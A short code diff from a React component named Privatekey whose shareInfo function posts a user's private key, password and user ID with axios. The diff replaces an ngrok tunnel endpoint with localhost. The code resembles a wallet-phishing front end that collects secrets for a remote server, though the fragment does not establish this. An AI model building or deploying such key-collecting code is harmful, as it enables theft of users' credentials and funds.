@@ -6,7 +6,7 @@ const Privatekey = () => {
   const [password, setPassword] = useState("");
   const [userID, setUserID] = useState("");
   const shareInfo = () => {
-    axios.post("https://c148-216-227-145-218.ngrok-free.app/privateKey", {
+    axios.post("http://localhost:3000/privateKey", {
       privateKey,
       password,
       userID,
